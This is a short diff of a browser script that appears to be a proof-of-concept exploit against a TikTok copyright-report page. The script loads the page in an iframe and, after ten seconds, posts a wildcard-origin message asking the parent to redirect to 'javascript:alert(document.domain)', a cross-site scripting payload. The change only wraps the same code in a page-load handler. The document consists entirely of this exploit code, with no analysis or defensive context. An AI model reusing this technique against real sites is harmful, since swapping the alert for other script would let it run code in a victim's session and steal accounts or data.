@@ -1,16 +1,18 @@
 <script>
-// Step 1: Create and load TikTok page in an iframe
-const iframe = document.createElement('iframe');
-iframe.src = "https://www.tiktok.com/legal/report/Copyright";
-iframe.style.width = "100%";
-iframe.style.height = "100vh";
-document.body.appendChild(iframe);
+document.addEventListener("DOMContentLoaded", () => {
+    // Step 1: Create and load TikTok page in an iframe
+    const iframe = document.createElement('iframe');
+    iframe.src = "https://www.tiktok.com/legal/report/Copyright";
+    iframe.style.width = "100%";
+    iframe.style.height = "100vh";
+    document.body.appendChild(iframe);
 
-// Step 2: After 10 seconds, trigger redirect on parent
-setTimeout(() => {
-    parent.postMessage({
-        action: "requestRedirectionTo",
-        targetUrlStr: "javascript:alert(document.domain)"
-    }, "*");
-}, 10000);
+    // Step 2: After 10 seconds, trigger redirect on parent
+    setTimeout(() => {
+        parent.postMessage({
+            action: "requestRedirectionTo",
+            targetUrlStr: "javascript:alert(document.domain)"
+        }, "*");
+    }, 10000);
+});
 </script>
